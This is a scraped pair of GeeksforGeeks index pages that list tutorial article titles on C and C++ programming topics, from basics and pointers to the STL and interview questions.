C Programming Language - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects C Programming Language C is a procedural programming language. It was initially developed by Dennis Ritchie as a system programming language to write operating system. The main features of C language include low-level access to memory, simple set of keywords, and clean style, these features make C language suitable for system programming like operating system or compiler development. Recent Articles on C ! C Output & Multiple Choice Questions Basics, Variable Declaration, Definition and Scope, Data Types, Storage Classes, Input/Output, Operators, Preprocessor, Array & Strings, Control Statements, Functions, Pointers, Enum, Struct and Union, Memory Management, File Handling, Puzzles, Misc, C Language Interview Questions, Multiple Choice Questions Basics: C Language Introduction C Programming Language Standard int (1 sign bit + 31 data bits) keyword in C Is it fine to write “void main()” or “main()” in C/C++? Difference between “int main()” and “int main(void)” in C/C++? Macros and Preprocessors in C Compiling a C program:- Behind the Scenes Benefits of C over other languages Program error signals Escape sequences in C Line Slicing in C C/ C++ Tokens Variable Declaration, Definition and Scope: Variables and Keywords in C How are variables scoped in C – Static or Dynamic? Scope rules in C How Linkers Resolve Multiply Defined Global Symbols? Quiz on Variable Declaration and Scope Complicated declarations in C Redeclaration of global variable in C Internal and External Linkage Declare variable as constant Why variables doesn’t start with numbers Redeclaration of global variables Initialization of global and static variables Data Types: Data Types in C Use of bool in C Integer Promotions in C Quiz on Data Types in C Comparison of a float with a value in C Need of long data type in C size_t data type in C Interesting facts about data-types and modifiers Float and Double in C Character arithmetic in C Typecasting in C Storage Classes: Storage Classes in C Static Variables in C Understanding “extern” keyword in C What are the default values of static variables in C? Understanding “volatile” qualifier in C Const Qualifier in C Initialization of static variables in C Understanding “register” keyword in C Quiz on Storage Classes in C Understanding volatile qualifier in C- Set 1 Input/Output: Returned values of printf() and scanf() What is return type of getchar(), fgetc() and getc() ? Scansets in C puts() vs printf() for printing a string What is use of %n in printf() ? How to print % using printf()? Quiz on Input Output in C Difference between printf, sprintf and fprintf? Difference between getc(), getchar(), getch() and getche() Difference between %d and %i format specifier Use of fflush(stdin) in C Clearing input buffer in C/C++ scanf() and fscanf() in C getchar_unlocked() in C Problem with scanf() Differentiate printable and control character rand() and srand() in C/C++ Operators: Introduction to operators in C and Arithmetic Operators Relational and Logical Operators in C Bitwise Operators in C Operator Precedence and Associativity in C Evaluation order of operands Comma in C and C++ sizeof operator in C Operands for sizeof operator A comma operator question Result of comma operator as l-value in C and C++ Order of operands for logical operators Increment (Decrement) operators require L-value Expression Precedence of postfix ++ and prefix ++ in C/C++ Modulus on Negative Numbers C/C++ Ternary Operator – Some Interesting Observations Pre-increment (or pre-decrement) in C++ Difference between ++*p, *p++ and *++p Results of comparison operations in C and C++ To find sum of two numbers without using any operator Sequence Points in C Execution of printf with ++ operators Anything written in sizeof() is never executed Difference between strlen() and sizeof() Stringizing and Token-pasting operator Preprocessor: Write a C macro PRINT(x) which prints x Variable length arguments for Macros Multiline macros in C CRASH() macro – interpretation The OFFSETOF() macro, Branch prediction macros in GCC Diffference between #define and const in C? A C Programming Language Puzzle What’s difference between header files “stdio.h” and “stdlib.h” ? How to print a variable name in C? Constants in C How a Preprocessor works Preprocessor Directives : Behind the scene-1 Preprocessor Directives : Behind the scene-2 isgraph() library function write your own header file in C difftime() library function tmpnam() library function _Generic keyword in C math.h library functions typedef versus #define in C strftime() library function exec family of functions Arrays & Strings: Introduction to Arrays in C Language Strings in C Language Properties of array in C Language Do not use sizeof for array parameters Initialization of variables sized arrays in C Are array members deeply copied? What is the difference between single quoted and double quoted declaration of char array? Initialization of a multidimensional arrays in C/C++ Write one line functions for strcat() and strcmp() What’s difference between char s[] and char *s in C gets() is risky to use! C function to Swap strings, Storage for Strings in C Difference between array and pointer How to dynamically allocate a 2D array in C? How to pass a 2D array as a parameter in C? How to write long strings in Multi-lines C/C++? What are the data types for which it is not possible to create an array? Variable Length Arrays in C and C++ Short hand array notation Accessing array out of bounds strcpy() in C/C++ strcmp() in C/C++ strdup() and strdndup() in C/C++ Pass an array by value Reverse a string in C/C++ strpbrk() in C strcoll() in C/C++ ispunct() in C strspn() in C isalpha() and isdigit() in C/C++ Control Statements: What should be data type of case labels of switch statement in C? For Versus While A nested loop puzzle switch statement in C Difference between while(1) and while(0) goto statement Continue Statement Break Statement Using range in switch case Functions: Functions in C Importance of function prototype in C Functions that are executed before and after main() in C return statement vs exit() in main() How to Count Variable Numbers of Arguments in C?, What is evaluation order of function parameters in C? Does C support function overloading? How can we return multiple values from a function? What is the purpose of a function prototype? Static functions in C exit(), abort() and assert() Implicit return type int in C What happens when a function is called before its declaration in C? _Noreturn function specifier in C exit() vs _Exit() __func__ identifier in C Callback function in C Nested functions in C Parameter Passing Techniques pow() function in C tolower() function in C time() function in C Pointers: Introduction to pointers in C and C++ Double Pointer (Pointer to Pointer) in C Why C treats array parameters as pointers? Output of the program | Dereference, Reference, Dereference, Reference Dangling, Void , Null and Wild Pointers An Uncommon representation of array elements How to declare a pointer to a function? Pointer vs Array in C void pointer in C NULL pointer in C ! Function Pointer in C near, far and huge pointers Generic Linked List in C restrict keyword in C const char *p, char * const p and const char * const p Pointer to an Array Enum, Struct and Union: Enum in C Structures in C Union in C Struct Hack Structure Member Alignment, Padding and Data Packing Operations on struct variables in C Bit Fields in C Structure Sorting (By Multiple Rules) in C++ Flexible array members in structure Difference between Structure and Union Difference between C structures and C++ structures Anonymous Union and Structure in C Compound Literals in C Memory Management: Memory Layout of C Programs, How to deallocate memory without using free() in C? calloc() versus malloc() How does free() know the size of memory to be deallocated? Use of realloc() What is Memory Leak? How can we avoid? File Handling: fseek() vs rewind() in C EOF, getc() and feof() in C fopen() for an existing file in write mode Read/Write structure to a file fgets() and gets() in C Basics of File Handling fsetpos() in C rename function in C/C++ tmpfile() function in C fgetc() and fputc() in C fseek() in C/C++ ftell() in C lseek() in C/C++ remove function in C/C++ Merge contents of two files into a third file Print contents of file in C Puzzles: C Program to print numbers from 1 to N without using semicolon? How to find sum of two numbers without using any operator How will you show memory representation of C variables? Condition To Print “HelloWord” Change/add only one character and print ‘*’ exactly 20 times How can we sum the digits of a given number in single statement? What is the best way in C to convert a number to a string? Calculate Logn in one line Print “Even” or “Odd” without using Conditional statement How will you print numbers from 1 to 100 without using loop? How can we sum the digits of a given number in single statement? How will you print “Geeks for Geeks” without using a semicolon Write a one line C function to round floating point numbers How will implement Your Own sizeof How to count set bits in a floating point number in C? How to change the output of printf() in main() ? How to find length of a string without string.h and loop in C? Implement your own itoa() Write a C program that does not terminate when Ctrl+C is pressed How to measure time taken by a function in C? Print a long int in C using putchar() only Convert a floating point number to string in C How to write a running C code without main()? Write your own memcpy() C program to print characters without using format specifiers C program to print a string without any quote (singe or double) in the program Execute both if and else statements simultaneously Print “Hello World” without using any header file Misc: Quine – A self-reproducing program Complicated declarations in C Use of bool in C Sequence Points in C | Set 1 Optimization Techniques | Set 2 (swapping), ASCII NUL, ASCII 0 (’0?) and Numeric literal 0 Little and Big Endian Mystery, Comparator function of qsort() in C Program to validate an IP address Multithreading in C Assertions in C/C++ fork() in C Interesting Facts in C Programming Precision of floating point numbers in C++ (floor(), ceil(), trunc(), round() and setprecision()) setjump() and longjump() in C nextafter() and nexttoward() in C/C++ pthread_cancel() in C pthread_equal() in C pthread_self() in C Local Labels in C lvalue and rvalue in C Get and set the stack size of thread attribute Difference between fork() and exec() Errors in C/C++ Why is C considered faster than other languages Incompatibilities between C and C++ Convert C/C++ code to assembly language Error Handling in C Executing main() in C/C++ : Behind the scene Hygienic Macros in C Command line arguments in C/C++ scanf(), fscanf(), sscanf(), scanf_s(), fscanf_s(), sscanf_s() Some Interesting Facts in C Programming Database Connectivity using C/C++ Function Interposition in C Macros vs Functions Write your own memcpy() and memmove() C Language Interview Questions Commonly Asked C Programming Interview Questions | Set 1 Commonly Asked C Programming Interview Questions | Set 2 C/C++ Programs Coding Practice Platform My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

C++ Programming Language - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Basicsexpand_moreC++ Programming LanguageIntroduction to C++ Programming LanguageSetting up C++ Development EnvironmentC++ Programming BasicsC++ Data TypesVariables in C++Loops in C and C++Decision Making in C / C++ (if , if..else, Nested if, if-else-if )Basic Input/Outputexpand_moreI/O Redirection in C++Basic Input / Output in C++Clearing The Input Buffer In C/C++Operatorsexpand_moreOperators in C / C++Unary operators in C/C++Pre-increment (or pre-decrement) in C++new and delete operators in C++ for dynamic memoryArraysexpand_moreArrays in C/C++Multidimensional Arrays in C / C++How to print size of array parameter in C++?Stringsexpand_morestd::string class in C++Raw string literal in C++Array of Strings in C++ (5 Different Ways to Create)Tokenizing a string in C++strrchr() function in C/C++stringstream in C++ and its applicationsFunctionsexpand_moreFunctions in C/C++Default Arguments in C++Inline Functions in C++Return from void functions in C++Functors in C++Pointers & Referencesexpand_morePointers in C and C++ | Set 1 (Introduction, Arithmetic and Array)Opaque PointerReferences in C++‘this’ pointer in C++Introduction of Smart Pointers in C++ and It’s TypesPointers vs References in C++Object Oriented Programmingexpand_moreObject Oriented Programming in C++C++ Classes and ObjectsInheritance in C++Polymorphism in C++Encapsulation in C++Abstraction in C++Function Overloading in C++Operator Overloading in C++Constructors & Destructorsexpand_moreConstructors in C++Copy Constructor in C++Destructors in C++C++ Internals | Default Constructors | Set 1Private DestructorException Handlingexpand_moreException Handling in C++Stack Unwinding in C++Catching base and derived classes as exceptionsCatch block and type conversion in C++Exception handling and object destruction | Set 1File Handlingexpand_moreFile Handling through C++ ClassesRead/Write Class Objects from/to File in C++C++ program to create a fileCSV file management using C++Four File Handling Hacks which every C/C++ Programmer should knowStandart Template Library (STL)expand_moreThe C++ Standard Template Library (STL)Containers in C++ STL (Standard Template Library)Pair in C++ Standard Template Library (STL)List in C++ Standard Template Library (STL)Deque in C++ Standard Template Library (STL)Queue in Standard Template Library (STL)Priority Queue in C++ Standard Template Library (STL)Set in C++ Standard Template Library (STL)Unordered Sets in C++ Standard Template LibraryMultiset in C++ Standard Template Library (STL)Map in C++ Standard Template Library (STL)Advanced C++ with boost librarylibrary in C++ STL C++ Programming Language C++ is a general purpose programming language and widely used now a days for competitive programming. It has imperative, object-oriented and generic programming features. C++ runs on lots of platform like Windows, Linux, Unix, Mac etc. C++ Recent Articles! Basics, C vs C++, C++ vs Java, Input and Output, Operators, Arrays and Strings, Functions, References and Pointers, Dynamic memory allocation, Object Oriented Programming(OOP),Constructor and Destructor, Function Overloading, Operator Overloading, Virtual Functions, Exception Handling, Namespaces, Standard Template Library (STL), Inheritance, C++ Library, C++ Advanced, C++ in Competitive Programming, Puzzles, Interview Questions, Multiple Choice Questions Basics Setting up C++ Development Environment Writing first C++ program(Practice) void main or main() C++ Data Types(Practice) Basic Input/Output Response on exceeding valid range of data types C++ Preprocessors Operators in C++(Practice) Loops (Practice) Decision Making in C++(Practice) Execute both if and else simultaneously How to compile 32-bit program on 64-bit gcc in C and C++ Switch statement in C++(Practice) Functions in C++(Practice) Arrays in C/C++(Practice) Strings in C++(Practice) Pointers in C++(Practice) References in C++ Introduction to OOP in C++ C vs C++ C program that won’t compile in C++ Undefined Behaviour in C and C++ Name Mangling and extern “C” in C++ void * in C vs C++ Program that produces different results in C and C++ Type difference of character literals in C vs C++ Difference between Structures in C and C++ C++ vs Java Inheritance in C++ vs Java static keyword in C++ vs Java default virtual behavior in C++ vs Java Exception Handling in C++ vs Java Foreach in C++ vs Java Templates in C++ vs Generics in Java Foreach in C++ vs Java Floating Point Operations & Associativity in C, C++ and Java Similarities between Java and C++ Input and output I/O Redirection in C++ Clearing The Input Buffer Basic Input/Output(Practice) cout << endl vs cout << “\n” in C++ Problem with scanf() when there is fgets()/gets()/scanf() after it How to use getline() in C++ when there are blank lines in input? scanf() and fscanf() in C – Simple Yet Poweful Using return value of cin to take unknown number of inputs in C++ How to change the output of printf() in main() ? Implementation of a Falling Matrix What does buffer flush means in C++ ? kbhit in C language Code to generate the map of India Operators Operators in C++ Unary operators in C/C++ Conditionally assign a value without using conditional and arithmetic operators Execution of printf with ++ operators Set a variable without using Arithmetic, Relational or Conditional Operator Scope Resolution Operator vs this pointer Pre-increment (or pre-decrement) new and delete operator in C++ CHAR_BIT in C Casting operators| Set 1 (const_cast) Arrays and Strings Arrays in C/C++ Array of Strings Multidimensional arrays in C/C++ Raw string literal Counts of distinct consecutive sub-string of length two Converting string to number and vice-versa Find size of array in C/C++ without using sizeof How to quickly reverse a string in C++? Tokenizing a string in C++ Getline() function and character array Convert string to char array in C++ C++ string class and its applications , Set 2 How to create a dynamic 2D array inside a class in C++ ? Lexicographically next permutation Print size of array parameter Split a string in C/C++, Python and Java Stringstream in C++ and its applications Strchr() function in C/C++ Isspace() in C/C++ and its application to count whitespace characters Char* vs std:string vs char[] in C++ Std::lexicographical_compare() in C++STL Std::string::at in C++ Std::substr() in C/C++ std::stol() and std::stoll() functions in C++ Extract all integers from string in C++ Strchr() function in C++ and its applications Strcat() vs strncat() in C++ Strncat() function in C/C++ Strpbrk() in C strcoll() in C/C++ Why strcpy and strncpy are not safe to use? Functions Functions in C++ Default Arguments C function argument and return values Inline Functions Return from void functions Returning multiple values from a function using Tuple and Pair Function Call Puzzle Functors Ciel and floor functions in C++ Const member functions atol(), atoll() and atof() functions in C/C++ swap() in C++ wmemmove() function in c++ wcscat() function in C++ wcscmp() function in C++ with Examples wcscpy() function in C++ with Examples wcslen() function in C++ with Examples difftime() function in C++ asctime() function in C++ localtime() function in C++ scalbn() function in C++ isunordered() function in C++ isnormal() in C++ isinf() function in C++ quick_exit() function in C++ with Examples ctime() Function in C/C++ clock() function in C/C++ nearbyint() function in C++ quick_exit() function in C++ with Examples wcscmp() function in C++ with Examples wcscpy() function in C++ with Examples wcslen() function in C++ with Examples Pointers and References Pointers in C and C++ What is Array Decay in C++? How can it be prevented? Opaque Pointer References Can references refer to invalid location? Pass arguments by reference or pointer Smart Pointers ‘this’ pointer Type of ‘this’ pointer “delete this” auto_ptr, unique_ptr, shared_ptr and weak_ptr Dangling, Void , Null and Wild Pointers Passing by pointer Vs Passing by Reference NaN in C++ – What is it and how to check for it? nullptr Pointers vs References in C++ Dynamic memory allocation new and delete operator in C++ malloc() vs new delete() and free() Std::get_temporary_buffer in C++ Object Oriented Programming(OOP) Object oriented design Introduction to OOP in C++ Classes and Objects Access Modifiers Inheritance Polymorphism Encapsulation Data Abstraction Structure vs class Can a C++ class have an object of self type? Why is the size of an empty class not zero? Static data members in C++ Some interesting facts about static member functions Friend class and function Local Class Nested Classes Simulating final class Constructor and Destructor Constructors Copy Constructor Destructors Does compiler create default constructor when we write our own? When should we write our own copy constructor? When is copy constructor called? Initialization of data members Use of explicit keyword When do we use Initializer List in? Default Constructors Private Destructor Playing with Destructors Copy elision C++ default constructor | Built-in types When does compiler create a default constructor and copy constructor? Why copy constructor argument should be const in C++? Advanced C++ | Virtual Constructor Advanced C++ | Virtual Copy Constructor Default Constructors When are static objects destroyed? Is it possible to call constructor and destructor explicitly? Function Overloading Function Overloading Functions that can’t be overloaded Function overloading and const keyword Function overloading and return type Does overloading work with Inheritance? Can main() be overloaded Function Overloading and float Operator Overloading Operator Overloading Copy constructor vs assignment operator When should we write our own assignment operator? Operators that cannot be overloaded Conversion Operators Is assignment operator inherited? Default Assignment Operator and References Overloading stream insertion (<<) and extraction (>>) operators Overloading array index operator [] Virtual Functions Virtual Functions and Runtime Polymorphism Default arguments and virtual function Virtual functions in derived classes Can static functions be virtual? Virtual Destructor Virtual Constructor Virtual Copy Constructor RTTI (Run-time type information) Can virtual functions be private? Inline virtual function Pure Virtual Functions and Abstract Classes Pure virtual destructor Exception Handling Exception Handling Basics Stack Unwinding Catching base and derived classes as exceptions Catch block and type conversion Exception handling and object destruction Namespace Namespace in C++ | Set 1 (Introduction) Set 2 (Extending namespace and Unnamed namespace) Namespace in C++ | Set 3 (Accessing, creating header, nesting and aliasing) Inline namespaces and usage of the “using” directive inside namespaces Can namespaces be nested? Standard Template Library (STL) Algorithms Introduction to STL Sorting Searching Containers: Pair (Practice) Vector (Practice) Ways to copy a vector in C++ Sorting 2D Vector in C++ | Set 3 (By number of columns),(Sort in descending order by first and second) Sorting 2D Vector in C++ | Set 2 (In descending order by row and column) 2D vector in C++ with user defined size Vector::clear() and vector::erase() in C++ STL Passing vector to a function in C++ Vector::push_back() and vector::pop_back() in C++ STL Vector::empty() and vector::size() in C++ STL vector::front() and vector::back() in C++ STL Initialize a vector; Different ways Sorting 2D Vector in C++ | Set 1 (By row and column), (Sort by first and second) Computing index using pointers returned by STL functions in C++ List List in C++ | Set 2 (Some Useful Functions) Forward List in C++ | Set 1 (Introduction and Important Functions) Forward List in C++ | Set 2 (Manipulating Functions) list::remove() and list::remove_if() in C++ STL Forward_list::front() and forward_list::empty() in C++ STL Forward_list :: remove() and forward_list :: remove_if() in C++ STL forward_list::unique() in C++ STL forward_list::reverse() in C++ STL forward_list::max_size() in C++ STL forward_list::before_begin() in C++ STL forward_list::cbefore_begin() in C++ STL forward_list::unique() in C++ STL forward_list::before_begin() in C++ STL forward_list::cbefore_begin() in C++ STL forward_list::reverse() in C++ STL forward_list::max_size() in C++ STL forward_list::splice_after() in C++ STL list::empty() and list::size() in C++ STL list::front() and list::back() in C++ STL list::pop_front() and list::pop_back() in C++ STL list::push_front() and list::push_back() in C++ STL list push_front() function in C++ STL list pop_back() function in C++ STL list pop_front() function in C++ STL list reverse function in C++ STL list resize() function in C++ STL list size() function in C++ STL list max_size() function in C++ STL Dequeue Deque::empty() and deque::size() in C++ STL Deque::pop_front() and deque::pop_back() in C++ STL Deque::clear() and deque::erase() in C++ STL Queue (Practice) Queue::front() and queue::back() in C++ STL Queue::push() and queue::pop() in C++ STL queue::empty() and queue::size() in C++ STL Priority Queue Stack (Practice) Stack::push() and stack::pop() in C++ STL Forward_list :: push_front() and forward_list :: pop_front() in C++ STL Stack::top() in C++ STL Stack::empty() and stack::size() in C++ STL Set (Practice) Count number of unique Triangles using STL | Set 1 (Using set) std::istream_iterator and std::ostream_iterator in C++ STL Std::next_permutation and prev_permutation in C++ Std::stoul and std::stoull in C++ Shuffle vs random_shuffle in C++ Difference between set, multiset, unordered_set, unordered_multiset Check if a key is present in a C++ map or unordered_map Std::stable_partition in C++ Valarray slice selector Std::memchr in C++ Std::strncmp() in C++ Stable_sort() in C++ STL Std::memcmp() in C++ Std::memset in C++ Std::bucket_count and std::bucket_size in unordered_map in C++ Map of pairs in STL Range-based for loop in C++ Std::includes() in C++ STL Std::set_symmetric_difference in C++ Std::sort_heap in C++ Map vs unordered_map in C++ Round() in C++ Modulus of two float or double numbers Multiset Map (Practice) Heap using STL C++ Multimap Multimap in C++ Standard Template Library (STL) multimap::find() in C++ STL multimap::erase() in C++ STL map emplace() in C++ STL multimap::emplace_hint() in C++ STL multimap::emplace() in C++ STL multimap::count() in C++ STL multimap::find() in C++ STL multimap::erase() in C++ STL multimap::begin() and multimap::end() in C++ STL multimap::cbegin() and multimap::cend() in C++ STL map cbegin() and cend() function in C++ STL multimap::crbegin() and multimap::crend() in C++ STL multimap size() function in C++ STL multimap lower_bound() function in C++ STL multimap swap() function in C++ STL multimap upper_bound() function in C++ STL multimap maxsize() in C++ STL multimap insert() in C++ STL multimap equal_range() in C++ STL CPP-Math sinh() function in C++ STL cosh() function in C++ STL tanh() function in C++ STL acos() function in C++ STL asinh() function in C++ STL acosh() function in C++ STL atanh() function in C++ STL More: sort() in C++ STL Strand sort Type Inference in C++ (auto and decltype) transform() in C++ STL Variadic function templates in C++ Template Specialization Implementing iterator pattern of a singly linked list Binary Search functions in C++ STL Descending order in Map and Multimap of C++ STL Insertion and Deletion in STL Set C++ set::key_comp() in C++ STL set value_comp() function in C++ STL unordered_set get_allocator() in C++ STL with Examples Inheritance What all is inherited from parent class in C++? Virtual Functions and Runtime Polymorphism in C++ Multiple Inheritance in C++ What happens when more restrictive access is given to a derived class method in C++? Object Slicing in C++ Hiding of all overloaded methods in base class Inheritance and friendship Simulating final class C++ Library <random> file – generators and distributions Array type manipulation C++ programming and STL facts Sqrt, sqrtl and sqrtf in C++ std::stod, std::stof, std::stold in C++ C program to demonstrate fork() and pipe() Complex numbers in C++ | Set 1 Set 2 Inbuilt library functions for user Input Rename function in C/C++ Chrono valarray class Floating Point Manipulation (fmod(), remainder(), remquo() … in cmath)(Practice) Character Classification: cctype Snprintf() in C library Boost::split in C++ library Modulus of two float or double numbers Is_trivial function in C++ Array sum in C++ STL Div() function in C++ Exit() vs _Exit() in C and C++ Std::none_of in C++ Isprint() in C++ Iscntrl() in C++ and its application to find control characters Std::partition_point in C++ Iterator Invalidation in C++ Fesetround() and fegetround() in C++ and their application Rint(), rintf(), rintl() in C++ Hypot(), hypotf(), hypotl() in C++ Std::gslice | Valarray generalized slice selector std::setbase, std::setw , std::setfill in C++ Strxfrm() in C/C++ Set position with seekg() in C++ language file handling Strstr() in C/C++ Difftime() C library function Socket Programming Precision of floating point numbers in C++ (floor(), ceil(), trunc(), round() and setprecision()) <bit/stdc++.h> header file std::string class in C++ Merge operations using STL in C++ (merge, includes, set_union, set_intersection, set_difference, ..) std::partition in C++ STL Ratio Manipulations in C++ | Set 1 (Arithmetic) , Set 2 (Comparison) numeric header in C++ STL | Set 1 (accumulate() and partial_sum()), Set 2 (adjacent_difference(), inner_product() and iota()) Bind function and placeholders Array class Tuples Regex (Regular Expression) Common Subtleties in Vector STLs Understanding constexpr specifier unordered_multiset and its uses unordered_multimap and its application Populating a vector in C++ using fill() and fill_n() Writing OS Independent Code in C/C++ C Program to display hostname and IP address Database Connectivity using C/C++ C++ bitset and its application unordered_map in STL and its applications unorderd_set in STL and its applications nextafter() and nexttoward() C++ Advanced User Defined Literal Placement new operator Advanced C++ with boost library Copy-and-Swap Idiom Zombie and Orphan Processes Lambda expression C++ | Signal Handling Preventing Object Copy in C++ Command line arguments in C++ C++ in Competitive Programming Writing C/C++ code efficiently in Competitive programming Useful Array algorithms in C++ STL searching in fork() Data Type Ranges and their macros Cin-Cout vs Scanf-Printf getchar_unlocked() – faster input in C/C++ for Competitive Programming C qsort() vs C++ sort() Middle of three using minimum comparisons Check for integer overflow on multiplication Generating Test Cases (generate() and generate_n() Puzzles Can we call an undeclared function in? Can we access global variable if there is a local variable with same name? Can we use function on left side of an expression in C and C++? Can we access private data members of a class without using a member or a friend function? How to make a C++ class whose objects can only be dynamically allocated? How to print “GeeksforGeeks” with empty main() Print 1 to 100, without loop and recursion C/C++ Tricky Programs Print a number 100 times without using loop, recursion and macro expansion in C++ How to restrict dynamic allocation of objects Sum of digits of a number in single statement Write a URL in a C++ program Zoom digits of an integer Composite Design Pattern in C++ Assign value without any control statement Printing pyramid pattern How to swap two variables in one line in C/C++, Python and Java? Program to shut down a computer Interview Questions Commonly Asked C++ Interview Questions | Set 1 Commonly Asked OOP Interview Questions | Set 1 C/C++ Programs Quick Links: Recent Articles on C++ Practice Track on C++ C++ Output & Multiple Choice Questions My Personal Notes arrow_drop_up Save 